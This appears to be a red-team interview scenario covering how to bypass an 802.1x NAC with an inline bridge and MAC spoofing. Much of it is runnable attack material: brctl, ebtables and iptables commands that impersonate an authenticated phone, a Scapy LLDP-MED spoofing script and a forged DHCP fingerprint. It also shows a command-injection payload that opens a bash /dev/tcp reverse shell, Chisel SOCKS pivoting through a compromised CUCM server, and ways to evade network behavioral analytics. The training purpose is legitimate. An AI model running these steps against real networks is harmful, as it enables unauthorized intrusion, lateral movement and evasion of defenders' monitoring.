---
tags: [vapt, ultra-scenario, interview, expert, red-team]
difficulty: extreme
module: "Ultimate Expert Scenario Bank"
topic: "Ultra-Scenario - Network 01"
---

# Ultra-Scenario - Network 01: Bypassing 802.1x NAC via MAC Spoofing and Rogue Devices

## 1. Scenario Overview

You have physical access to a high-security corporate facility. You drop onto an open conference room port, but immediately notice the link goes dead. You investigate and identify an 802.1x Network Access Control (NAC) implementation using EAP-TLS with strong certificate validation. No plain MAC authentication bypass (MAB) is allowed for regular workstations, though printers and VOIP phones are scattered around. 

The objective is to achieve initial network access, bypass the 802.1x NAC, pivot from the restricted VLAN to a sensitive internal segment, evade the network behavioral analytics (NBA) solutions, and establish a persistence foothold using a rogue hardware implant (e.g., a Dropbox / Pi).

## 2. The Attack Path

### Stage 1: Reconnaissance and 802.1x Environment Mapping
*   **Passive Sniffing:** Using a passive tap to observe traffic between a legitimate client and the switch without bringing the link down.
*   **EAP Identification:** Identifying the exact EAP type (EAP-TLS, PEAP) and identifying MAB devices on the same physical switch.
*   **Device Profiling:** Spotting a VOIP phone operating with an active session, examining CDP/LLDP packets to understand VLAN assignments (Voice VLAN vs Data VLAN).

### Stage 2: Passive Inline Tap and MAC Bypassing (The "Fenrir" Approach)
*   **Hardware Setup:** Deploying a transparent Layer 1 bridge (using two USB-to-Ethernet adapters on a Raspberry Pi or custom hardware drop).
*   **Traffic Forwarding:** Using `brctl` and `ebtables` to seamlessly forward EAPOL packets from the victim device to the switch, maintaining the authenticated session.
*   **MAC Spoofing & Injection:** Configuring the rogue device to inject its own traffic using the MAC address of the authenticated victim device, but taking care to control IP and TCP sequencing.
*   **Traffic Isolation:** Dropping traffic sourced from the rogue device's management interface to prevent switch port security from triggering a violation due to multiple MAC addresses on a single port.

### Stage 3: Exploiting Voice VLANs and MAB
*   **LLDP-MED Spoofing:** Alternatively, crafting LLDP-MED packets to trick the switch port into believing a VOIP phone is connected, moving the port to the Voice VLAN.
*   **MAB Profiling Bypass:** Replicating the exact DHCP fingerprint, HTTP User-Agent, and open ports of a known IP phone model to fool the NAC profiling engine.
*   **VLAN Hopping (Voice to Data):** Utilizing misconfigured access control lists (ACLs) between the Voice and Data VLANs, or exploiting a web vulnerability on the internal IP PBX system to pivot.

### Stage 4: Evading EDR and Network Behavioral Analytics (NBA)
*   **Beaconing Evasion:** Routing C2 traffic over covert channels (e.g., ICMP tunneling, or blending with existing VOIP SIP/RTP traffic using a custom steganography tool).
*   **C2 Architecture:** Using a segmented payload deployment where the rogue device initiates the reverse shell over DNS/HTTPS with jitter, mimicking legitimate administrative polling.

---

## 3. Interview Deep-Dive: Q&A Interaction

### Q1: The interviewer says: "You plug into a wall jack and you see EAPOL frames. What specifically are you looking for in those packets to determine the authentication mechanism, and how do you differentiate between PEAP and EAP-TLS passively?"

**Candidate Expert Answer:**
"When analyzing EAPOL (EAP over LAN) frames, I'm examining the EAP payload encapsulation. I'd open Wireshark or `tcpdump` and filter for `eapol`. 
First, I look at the `EAP-Request/Identity` and the subsequent `EAP-Response/Identity` to see the username or machine name being supplied in the clear. If anonymity is enabled, I'll see something like `anonymous@domain.local`.
To differentiate PEAP and EAP-TLS passively, I analyze the EAP-Type field in the authentication phase.
- **EAP-TLS (Type 13):** I will see a TLS handshake initiated with a `Client Hello`, and crucially, a `Certificate` message from the client. The server will also send its certificate. EAP-TLS requires client-side certificates, so I'll observe the mutual exchange of certificates before the `Change Cipher Spec`.
- **PEAP (Type 25) / EAP-TTLS (Type 21):** The client does *not* send a certificate. Instead, the server sends a certificate to establish a secure TLS tunnel. Inside this encrypted tunnel, inner authentication (like MSCHAPv2) occurs. So, passively, I will only see the server certificate sent, followed by encrypted traffic.
By observing whether the client transmits a certificate during the initial EAP-TLS handshake, I can definitively identify EAP-TLS without ever actively transmitting."

### Q2: "Excellent. You realize it's EAP-TLS, and you don't have a certificate. However, you notice a VOIP phone next to the port. You decide to build a transparent inline bridge. Walk me through the exact `ebtables` and `iptables` configurations required to inject your traffic without tripping Port Security."

**Candidate Expert Answer:**
"Creating a transparent EAPOL bridge requires precise MAC management. If the switch sees an unexpected MAC address on an 802.1x authenticated port, it will trigger a security violation, shutting down the port or dropping our packets.
My hardware setup consists of two network interfaces (e.g., `eth0` to switch, `eth1` to VOIP phone) bridged together as `br0`.

First, I strip the MAC and IP configuration from `eth0` and `eth1` and bring them up in promiscuous mode:
```bash
ifconfig eth0 0.0.0.0 promisc up
ifconfig eth1 0.0.0.0 promisc up
brctl addbr br0
brctl addif br0 eth0 eth1
ifconfig br0 up
```

To avoid tripping port security, my rogue device must *never* send traffic using its native MAC addresses. All injected traffic must use the VOIP phone's MAC address. I'll note the phone's MAC (e.g., `00:11:22:33:44:55`).

I'll spoof the MAC on the bridge interface:
```bash
ifconfig br0 hw ether 00:11:22:33:44:55
```

Now, I need to prevent BPDU (Bridge Protocol Data Units) from my bridge from leaking to the switch and triggering BPDU Guard:
```bash
ebtables -A FORWARD -d 01:80:C2:00:00:00/ff:ff:ff:ff:ff:ff -j DROP
```

Next, to inject traffic, I need to ensure my packets use the same IP as the phone. I'll assign the phone's IP to `br0`, but this creates a conflict. I must NAT my injected traffic so it uses the phone's IP, but I must also drop incoming packets directed to my services from reaching the phone, and conversely, drop phone traffic from reaching my local sockets.
Using `iptables` and `macvlan`:
Instead of simple NAT, I use a custom routing namespace or `macvlan` interface mapped to the spoofed MAC, allowing me to inject TCP/UDP packets. For pure stealth, I use `scapy` or a custom C tool to raw-socket inject packets with the exact source MAC and IP of the phone, hijacking a UDP port that the phone isn't using (e.g., a high random port).

If I am using `iptables` for NAT on the bridge:
```bash
iptables -t nat -A POSTROUTING -o br0 -j SNAT --to-source <VOIP_IP>
```
But crucially, I must rewrite the source MAC via `ebtables` for any locally generated packets from my injection daemon:
```bash
ebtables -t nat -A POSTROUTING -s <My_Real_MAC> -j snat --to-src 00:11:22:33:44:55
```
This guarantees every packet leaving `eth0` towards the switch has the authenticated MAC."

### Q3: "Let's pivot. What if you just unplugged the phone and tried to use its MAC address directly. You find that the switch port still goes down, and MAB profiling fails. Why did MAB fail despite the MAC matching, and how do you emulate a Cisco IP Phone exactly?"

**Candidate Expert Answer:**
"Modern NAC systems (like Cisco ISE or Aruba ClearPass) don't rely solely on the MAC OUI for MAB (MAC Authentication Bypass) anymore because spoofing is trivial. They use Device Profiling.
When I plug in, the port goes down because of the physical link state change. When it comes back up, the NAC re-evaluates the endpoint.
If I just spoof the MAC, the NAC profiling engine expects a series of behavioral indicators that I am failing to produce.

**The Profiling Probes:**
1.  **CDP/LLDP (Layer 2):** The switch expects Cisco Discovery Protocol or Link Layer Discovery Protocol packets broadcasting device capabilities (e.g., Voice capability, specific firmware strings).
2.  **DHCP Fingerprinting (Layer 3):** When the device requests an IP, the DHCP `Parameter Request List` (Option 55) is heavily analyzed. A Windows PC requests a vastly different set of options compared to a Cisco 7940 VOIP phone.
3.  **HTTP User-Agent (Layer 7):** If the NAC forces a redirect or passive sniffing, it looks for the User-Agent in HTTP traffic.
4.  **Nmap/Active Scanning:** Some NACs run a quick active scan expecting specific ports open (e.g., SIP 5060, SCCP 2000, Web 80).

**How to completely emulate the Cisco IP Phone:**
1.  **MAC Spoofing:** `macchanger -m 00:11:22:33:44:55 eth0`
2.  **LLDP Emulation:** I will use a tool like `lldpd` or a custom Scapy script to broadcast LLDP-MED packets.
    *Payload Snippet (Scapy):*
    ```python
    lldp_frame = Ether(src="00:11:22:33:44:55", dst="01:80:c2:00:00:0e", type=0x88cc) / \
                 LLDPDUChassisID(subtype=4, id="00:11:22:33:44:55") / \
                 LLDPDUPortID(subtype=3, id="00:11:22:33:44:55") / \
                 LLDPDUTimeToLive(ttl=120) / \
                 LLDPDUSystemName(system_name="SEP001122334455") / \
                 LLDPDUSystemCapabilities(mac_bridge=True, telephone=True) / \
                 LLDPDUEndOfLLDPDU()
    sendp(lldp_frame, iface="eth0", loop=1, inter=30)
    ```
3.  **DHCP Fingerprinting:** I will modify `dhclient.conf` to mimic the exact Option 55 sequence of the phone.
    *Example `dhclient.conf`:*
    ```text
    send dhcp-client-identifier 01:00:11:22:33:44:55;
    send vendor-class-identifier "Cisco Systems, Inc. IP Phone CP-7940G";
    request subnet-mask, routers, domain-name-servers, host-name, domain-name, tftp-server-name, vendor-encapsulated-options;
    ```
4.  **Service Emulation:** I will stand up a quick local listener on port 80 and 5060 to return 200 OK responses to any profiling scans.

By faking all four vectors, the NAC profiles the port as a legitimate Cisco device, applies the MAB policy, and assigns the Voice VLAN."

### Q4: "You successfully emulate the phone, and you are dropped into the Voice VLAN (VLAN 100). The Voice VLAN is heavily restricted and cannot talk to the Data VLAN (VLAN 200) or the internet. However, you find the internal Cisco Unified Communications Manager (CUCM). Walk me through an attack path to pivot from CUCM into the Data VLAN."

**Candidate Expert Answer:**
"CUCM, being a massive enterprise application stack, is notoriously complex and often a soft target if unpatched, running various web services, database endpoints, and administrative consoles.

**Phase 1: Recon & Vulnerability Identification**
I will start with a stealthy Nmap scan against the CUCM IP (e.g., `10.10.100.10`). CUCM usually exposes ports 80, 443, 8080, 8443 (Tomcat).
I will access the Cisco Unified OS Administration portal. Since I need code execution, I'll look for known CVEs. Historically, CUCM has suffered from RCE vulnerabilities in its Tomcat application manager or via insecure deserialization (e.g., CVE-2023-20010 or older CVE-2011-3141).

Let's assume I find a blind SSRF or command injection in a diagnostics endpoint. Often, CUCM endpoints allow pinging or traceroute for troubleshooting. If I can bypass the input sanitization using backticks or command separators (e.g., `127.0.0.1; /bin/bash -c "bash -i >& /dev/tcp/10.10.100.X/4444 0>&1"`), I get a shell.

**Phase 2: Exploitation & Privesc**
Once I have a shell as the `tomcat` or `cucm` user, I need `root` to pivot effectively. Many telecom appliances run with `sudo` misconfigurations or outdated kernels (Dirty COW, PwnKit, etc.). If `sudo -l` shows `tcpdump` or `nmap` without a password, I'll use GTFOBins to elevate to root.

**Phase 3: The Pivot (VLAN Hopping via Dual-Homed Server)**
Here is the critical part: CUCM servers are intrinsically dual-homed or have routing capabilities between the Voice VLAN and the Data/Management VLANs. They *must* talk to the Voice VLAN to manage phones, but they *also* must talk to Active Directory, DNS, and internal databases on the Data VLAN.
I'll check the routing table: `ip route`.
I will see interfaces for `eth0` (VLAN 100) and possibly `eth1` or sub-interfaces pointing to VLAN 200 or the Management VLAN.

To pivot my traffic, I will deploy a lightweight SOCKS5 proxy on the compromised CUCM server. Since it's a Linux appliance, I can upload a statically compiled `Chisel` binary or just use built-in SSH dynamic port forwarding if SSH is accessible.
```bash
./chisel server -p 8000 --reverse
```
On my rogue device:
```bash
./chisel client <CUCM_IP>:8000 R:socks
```
Now, my rogue device in the isolated Voice VLAN has a SOCKS proxy tunneling directly through the CUCM appliance into the core Data VLAN, completely bypassing the switch's inter-VLAN ACLs because the traffic originates from a trusted infrastructure server.

From here, I can target Active Directory (Port 389/88/445) or ESXi hosts on the management subnet, mapping out the entire enterprise domain."

---

## 4. Deep Technical Analysis: The 802.1x EAP-TLS Protocol Flow

To truly master this scenario, a red teamer must understand the packet-level physics of the EAP-TLS exchange.

**The State Machine:**
1. **Supplicant (Client) Initialization:** Client connects, port state is `UNAUTHORIZED`. Only EAPOL, CDP, and STP traffic is allowed.
2. **EAPOL-Start:** Client sends `EAPOL-Start` (Multicast `01:80:C2:00:00:03`).
3. **EAP-Request/Identity:** Switch (Authenticator) replies.
4. **EAP-Response/Identity:** Client sends username. Switch wraps this in RADIUS Access-Request and sends to NAC (Authentication Server).
5. **EAP-Request/EAP-Type=TLS (Start):** NAC indicates it wants EAP-TLS.
6. **EAP-Response/EAP-Type=TLS (Client Hello):** TLS handshake begins.
7. **EAP-Request/EAP-Type=TLS (Server Hello, Certificate, Certificate Request):** NAC sends its cert and demands a client cert.
8. **EAP-Response/EAP-Type=TLS (Certificate, Client Key Exchange, Certificate Verify, Change Cipher Spec, Finished):** Client proves possession of the private key via `Certificate Verify` signature.
9. **EAP-Success:** Switch receives RADIUS Access-Accept, transitions port state to `AUTHORIZED`, and applies dynamic VLAN/ACL configurations.

**The Attack Vector:**
Because the port authorization is tied *entirely* to the source MAC address post-authentication, the switch operates as a dumb layer 2 bridge once the `EAP-Success` is received. If a rogue device can inject packets bearing the exact source MAC address, the switch ASIC processes them against the authorized session state. 
The only defense against this is **MACSec (802.1AE)**, which encrypts the link at Layer 2. If MACSec is not implemented, inline bridging is 100% effective.

## 5. Defense Evasion: Beating Network Behavioral Analytics

Modern networks deploy tools like Darktrace, ExtraHop, or Zeek to analyze traffic patterns.
When we pivot through CUCM using Chisel, our tunnel traffic will look like a long-lived, high-volume TCP stream, which will trigger an anomaly alert (e.g., "Unusual Internal Connections from Telecom Server").

**Evasion Techniques:**
1. **Traffic Shaping / C2 Profiling:** We modify our SOCKS tunnel to use a CDN or cloud-fronting pattern if egressing, or internally, we wrap the Chisel traffic inside TLS matching the exact SNI and ALPN of internal legitimate services (e.g., wrapping in mTLS looking like a CUCM-to-SIP-Gateway connection).
2. **Protocol Blending:** Instead of a raw TCP tunnel, we can use an HTTP-based tunnel that strictly adheres to REST API patterns. The payload chunks are embedded in standard HTTP POST JSON bodies that mimic CUCM diagnostic logging.
3. **Jitter and Sleep:** If we don't need real-time interactivity, we configure our internal pivot agent to poll asynchronously, spreading the traffic volume over hours rather than pushing an Nmap scan through the tunnel all at once. An Nmap scan through a SOCKS proxy via CUCM will immediately flag a "Port Scan Activity" alert originating from a highly restricted server. Instead, we use targeted, slow WMI or RPC queries.

---
*End of Scenario 01*
